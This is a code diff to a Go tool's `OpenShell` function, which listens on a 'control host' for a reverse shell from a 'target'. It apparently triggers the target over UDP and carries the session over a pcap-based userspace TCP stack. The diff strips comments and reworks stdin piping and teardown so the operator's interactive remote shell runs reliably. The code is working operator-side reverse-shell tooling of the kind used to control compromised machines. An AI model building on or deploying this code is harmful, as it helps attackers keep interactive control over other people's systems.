@@ -111,7 +111,6 @@ func Heartbeat(udpTarget, targetIP, targetPort, srcIP, srcPort string) error {
 
 // OpenShell opens a listener on the control host for a reverse shell from the target
 func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellType) error {
-	// Obtains the source ip and picks a random port for the reverse shell
 	rawIP := network.LocalIP().String()
 	srcPort := rand.Intn(45000) + 10000
 	srcIP, _, err := net.SplitHostPort(rawIP)
@@ -149,7 +148,6 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	udpCfg := pcapnet.UDPConfig{DeviceName: device.Name, LocalIP: localIP, LocalPort: uint16(srcPort), ReserveUDPPort: true}
 	serverCfg := pcapnet.ServerConfig{VirtualIP: virtualIP, AddressPool: pool, MTU: 1200, MaxPeers: 1}
 
-	// Change this from net.Listener to the concrete pcapnet type to unlock advanced peer methods
 	listener, err := pcapnet.ListenPCAPTCP(setupCtx, udpCfg, serverCfg, srcPort)
 	if err != nil {
 		return fmt.Errorf("opening shell listener: %w", err)
@@ -164,13 +162,12 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 
 	type connResult struct {
 		conn net.Conn
-		peer pcapnet.Peer // Track the pcapnet peer metadata
+		peer pcapnet.Peer
 		err  error
 	}
 	ch := make(chan connResult, 1)
 
 	go func() {
-		// Use AcceptWithPeer to track the exact peer connection ID and allocation
 		c, peer, e := listener.AcceptWithPeer()
 		ch <- connResult{conn: c, peer: peer, err: e}
 	}()
@@ -216,38 +213,63 @@ func OpenShell(udpTarget, targetIP, targetPort string, shellType message.ShellTy
 	}
 	defer restoreTerminal()
 
-	// Track the explicit I/O done signal
-	ioDone := make(chan struct{})
+	// CREATE AN OS PIPE TO BREAK CODESPACE/TTY SYSCALL BLOCKS
+	pipeReader, pipeWriter := io.Pipe()
 
-	// Context for tracking explicit background closure
+	// Asynchronously pump data from actual os.Stdin into our virtual pipe.
+	// When the connection drops, closing this loop's context or killing the application
+	// completely side-steps the stuck reader routine.
+	go func() {
+		buf := make([]byte, 1024)
+		for {
+			select {
+			case <-sessionCtx.Done():
+				return
+			default:
+				// Set a small read deadline if using a network link, or simply rely
+				// on regular buffer pumps.
+				n, err := os.Stdin.Read(buf)
+				if n > 0 {
+					_, _ = pipeWriter.Write(buf[:n])
+				}
+				if err != nil {
+					_ = pipeWriter.CloseWithError(err)
+					return
+				}
+			}
+		}
+	}()
+
+	// Watch session completion to force socket breakdown
 	go func() {
 		<-sessionCtx.Done()
 		_ = conn.Close()
+		_ = pipeReader.Close()
+		_ = pipeWriter.Close()
 	}()
 
-	// Remote → stdout pump
+	ioDone := make(chan struct{})
+
+	// Remote → stdout
 	go func() {
 		_, _ = io.Copy(os.Stdout, conn)
 		restoreTerminal()
 		fmt.Print("\r\n[-] Target disconnected.\r\n")
-		
-		// CRITICAL: Explicitly retire the allocation and wait for PCAT/TCP stack cleanup
-		// This forces the virtual gVisor environment to fully tear down and unblock
-		disconnectCtx, cancelDisconnect := context.WithTimeout(context.Background(), 3*time.Second)
+
+		disconnectCtx, cancelDisconnect := context.WithTimeout(context.Background(), 2*time.Second)
 		defer cancelDisconnect()
 		_ = listener.DisconnectPeer(disconnectCtx, res.peer)
 
-		cancelSession() // Unwind the main session context
+		cancelSession()
 	}()
 
-	// Stdin → remote pump
+	// Clean Stdin (via Pipe) → remote network socket
 	go func() {
-		_, _ = io.Copy(conn, os.Stdin)
+		_, _ = io.Copy(conn, pipeReader)
 		cancelSession()
 		close(ioDone)
 	}()
 
-	// Wait for cleanup completion or manual cancellation
 	select {
 	case <-sessionCtx.Done():
 	case <-ioDone:
